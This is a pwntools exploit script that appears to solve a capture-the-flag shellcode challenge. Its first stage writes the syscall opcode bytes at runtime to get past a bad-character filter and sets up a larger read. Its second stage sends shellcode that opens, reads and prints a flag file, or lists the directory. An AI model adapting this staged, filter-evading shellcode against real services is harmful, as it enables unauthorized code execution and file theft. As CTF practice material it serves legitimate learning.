#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/chall"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "localhost", 40802
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][1],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def exploit(io, libc=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][0]
            cmd = choosen_gdb + """
            # b *main+262
            b *main+254
            c
            si
            """#+"si\n"*15
            gdb.attach(io, gdbscript=cmd)
    
    print(io)

    p = b""
    p += asm(f"""
        lea rsi, [rip]
        /* write syscall */
        mov byte ptr [rsi+0x20], {0x0f-1}
        inc byte ptr [rsi+0x20]
        mov byte ptr [rsi+0x21], {0x05-1}
        inc byte ptr [rsi+0x21]
        mov rdx, 0x300 /* prepare for sys_read(0, 'rsi', 0x300) */
        mov rsp, {0x1337c0de0400}
        """)
    
    if b"\x0f" in p or b"\x05" in p:
        print("BADCHAR!")
        exit();

    p = p.ljust(0x1000, asm("nop"))
    io.sendafter(b":", p)
    

    p = b""
    options = ["read", "getdents"][0]
    if options == "getdents":
        p += asm(f"""
        {"nop;"*0x100}
        {shellcraft.open(".")}
        {shellcraft.getdents("rax","rsp", 0x100)}
        {shellcraft.write(1,"rsp", 0x100)}
        """)
    else:
        p += asm(f"""
        {"nop;"*0x100}
        {shellcraft.open("flag-d41d8cd98f00b204e9800998ecf8427e.txt")}
        {shellcraft.read("rax","rsp", 0x100)}
        {shellcraft.write(1,"rsp", 0x100)}
        """)
    io.send(p)
    print(io.recv())
    print(io.recv())
    io.interactive()

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        io = remote(HOST, PORT)
        # libc = ELF("___")
        
    else:
        LOCAL = True
        io = process(
            [TARGET, ],
            env={
            #     "LD_PRELOAD":DIR+"/___",
            #     "LD_LIBRARY_PATH":DIR+"/___",
            },
        )
        # libc = ELF("___")
    exploit(io, libc)
